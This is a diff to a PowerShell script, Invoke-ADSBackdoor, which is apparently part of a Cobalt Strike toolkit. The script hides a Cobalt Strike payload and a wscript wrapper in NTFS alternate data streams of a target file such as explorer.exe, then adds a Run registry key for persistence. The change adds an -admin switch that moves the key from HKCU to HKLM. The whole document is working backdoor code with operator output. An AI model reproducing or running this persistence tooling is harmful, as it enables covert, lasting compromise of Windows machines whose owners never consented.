@@ -13,7 +13,7 @@ payload. This script is not intented to be used outside the Cobalt Strike Und3rf
 correctly generate all of the correct arguments.
 
 .EXAMPLE
-PS C:\> Invoke-ADSBackdoor -RegKeyName Und3rf10w_key -backdoored_file_path C:\Windows\System32\explorer.exe -cobaltstrike_gen_payload <provided by cobalt strike>
+PS C:\> Invoke-ADSBackdoor -admin -RegKeyName Und3rf10w_key -backdoored_file_path C:\Windows\System32\explorer.exe -cobaltstrike_gen_payload <provided by cobalt strike>
 
 #>
 
@@ -22,6 +22,9 @@ PS C:\> Invoke-ADSBackdoor -RegKeyName Und3rf10w_key -backdoored_file_path C:\Wi
     Param(
         [Parameter(Mandatory=$True)]
         [string]$cobaltstrike_gen_payload,
+
+        [Parameter(Mandatory=$False)]
+        [switch]$admin,
         
         [Parameter(Mandatory=$False)]
         [string]$RegKeyName,
@@ -37,6 +40,12 @@ PS C:\> Invoke-ADSBackdoor -RegKeyName Und3rf10w_key -backdoored_file_path C:\Wi
     if (!$backdoored_file_path) {
         Write-Host "Path to file to backdoor not provided, defaulting to '$env:USERPROFILE\AppData'"
         $backdoored_file_path = "$env:USERPROFILE\AppData"
+    }
+
+    if ($admin){
+         $keyhive = "HKLM"
+    } else {
+         $keyhive = "HKCU"
     }
 
     $backdoored_file_path = [System.Environment]::ExpandEnvironmentVariables($backdoored_file_path)
@@ -60,12 +69,11 @@ PS C:\> Invoke-ADSBackdoor -RegKeyName Und3rf10w_key -backdoored_file_path C:\Wi
 
     Invoke-Command -ScriptBlock $createPayloadADS
     Invoke-Command -ScriptBlock $createWrapperADS
-    
+  
     $backCommand = "wscript.exe " + "`"$backdoored_file_path" + ":$wrapper_adsfile_name`""
-    New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name $RegKeyName -PropertyType String -Value $backCommand -Force
-    # TODO: make key path selectable. For reference, see: https://support.microsoft.com/en-us/kb/314866 & http://www.differencebetween.net/technology/hardware-technology/difference-between-hkey_current_user-and-hkey_local_machine/
+    New-ItemProperty -Path $keyhive":\Software\Microsoft\Windows\CurrentVersion\Run" -Name $RegKeyName -PropertyType String -Value $backCommand -Force
     Write-Host "Backdoor Deployed, details provided below; take notes:"
-    Write-Host "Reg key path: HKCU:\Software\Microsoft\Windows\CurrentVersion\Run\$RegKeyName"
+    Write-Host "Reg key path:" $keyhive":\Software\Microsoft\Windows\CurrentVersion\Run\$RegKeyName"
     Write-Host "Payload path: $backADSFile"
     Write-Host "Wrapper path: $wrapADSFile"
 }
